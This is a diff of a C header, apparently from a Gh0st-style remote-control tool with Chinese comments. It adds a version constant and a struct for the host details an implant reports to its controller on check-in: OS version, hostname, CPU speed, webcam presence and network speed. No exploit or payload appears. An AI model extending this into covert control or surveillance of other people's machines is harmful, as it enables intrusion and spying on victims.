@@ -1,10 +1,16 @@
 #pragma once
 
+#include <vcruntime_string.h>
+#include <string.h>
+
 #ifndef _MAX_PATH
 #define _MAX_PATH 260
 #endif
 
 #define FLAG_FINDEN 0x1234567
+
+// 当程序功能明显发生变化时，应该更新这个值，以便对被控程序进行区分
+#define DLL_VERSION "20241228"		// DLL版本
 
 // 命令枚举列表
 enum
@@ -134,3 +140,26 @@ typedef struct CONNECT_ADDRESS
 	char			szServerIP[_MAX_PATH];
 	int				iPort;
 } CONNECT_ADDRESS ;
+
+// 服务上线后发送的计算机信息
+// 此结构体一旦发生变化（比如大小），则以前版本的客户端无法连接新版主控.
+// 新版客户端也无法连接老版本的主控程序.
+// 为此，自20241228提交以来，为这个结构体预留字段，以便未来之不时之需
+// 请勿再修改此结构体，除非你决定不再兼容以前的程序或者单独编写代码来兼容
+typedef struct  LOGIN_INFOR
+{
+	unsigned char			bToken;									// 1.登陆信息
+	char					OsVerInfoEx[156];						// 2.版本信息
+	unsigned long			dwCPUMHz;								// 3.CPU主频
+	char					moduleVersion[24];						// 4.DLL模块版本
+	char					szPCName[_MAX_PATH];					// 5.主机名
+	int						bWebCamIsExist;							// 6.是否有摄像头
+	unsigned long			dwSpeed;								// 7.网速
+	char					szStartTime[20];						// 8.启动时间
+	char					szReserved[512];						// 9.保留字段
+
+	LOGIN_INFOR(){
+		memset(this, 0, sizeof(LOGIN_INFOR));
+		strcpy_s(moduleVersion, DLL_VERSION);
+	}
+}LOGIN_INFOR;
